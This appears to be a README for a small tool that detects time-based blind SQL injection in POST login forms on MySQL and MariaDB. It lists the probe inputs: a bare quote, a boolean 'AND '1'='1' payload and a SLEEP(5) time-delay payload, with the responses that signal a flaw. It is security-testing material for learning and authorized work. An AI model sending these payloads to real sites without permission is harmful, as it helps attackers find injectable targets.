# Time-Blind-SQLi-Detector

simple tool made to detect **Time-Based Blind SQL Injection** vulnerabilities on **POST request only**.  
use this tool for learning, CTF, and authorized penetration testing only.

---

## PoC

### Target Example

```
POST http://target.com/login.php
```

### Parameters

- `username`
- `password`

---

### Normal Request

```
username=admin&password=admin
```

---

### SQL Injection Test

```
username=admin'&password=admin
```

**Expected behavior:**
- HTTP status code changes (e.g. `200 → 500`)
- Response size changes
- Error message appears

If any of the above happens, the target may be vulnerable to **SQL Injection**.

---

### Boolean-Based Blind Test

```
username=admin' AND '1'='1&password=admin
```

**Expected behavior:**
- No error
- HTTP status code `200`
- Page behaves normally

If the response is normal, the target is likely vulnerable to  
**Boolean-Based Blind SQL Injection**.

> Some websites block `OR`, so `AND` is used instead.

---

### Time-Based Blind Test

```
username=admin' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND '1'='1&password=admin
```

**Expected behavior:**
- Response delayed ~5 seconds
- Website appears to freeze (with stable ping)

If delay occurs, the target is vulnerable to  
**Time-Based Blind SQL Injection**.

---

## Supported Databases

- MySQL
- MariaDB

---

## WARNING

SQL Injection attacks on systems without permission are **illegal**.  
This tool is for **educational purposes only**.  
The author is **not responsible** for any misuse or damage caused by this tool.
